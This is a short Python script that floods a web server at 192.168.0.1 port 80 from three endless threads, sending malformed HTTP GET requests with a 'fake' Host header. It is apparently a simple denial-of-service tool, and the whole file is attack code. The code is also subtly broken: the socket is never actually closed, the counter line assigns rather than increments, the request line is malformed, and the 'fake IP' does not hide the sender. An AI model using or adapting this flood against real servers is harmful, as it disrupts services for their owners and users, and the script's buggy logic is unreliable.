import socket
import threading

#TARGET = '127.0.0.1'
TARGET = '192.168.0.1'
PORT = 80
ADDR = (TARGET, PORT)
FAKE_IP = '182.21.20.32'

already_connected = 0


def attack():
    while True: 
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(ADDR)
        sock.sendto(('GET /' + TARGET + 'HTTP/1.1\r\n').encode('ascii'), ADDR)
        sock.sendto(('Host: ' + FAKE_IP + '\r\r\r\n').encode('ascii'), ADDR)
        sock.close

        global already_connected
        already_connected =+ 1
        if already_connected % 500 == 0:
            print(already_connected)


for i in range(3):
    thread = threading.Thread(target=attack)
    thread.start()
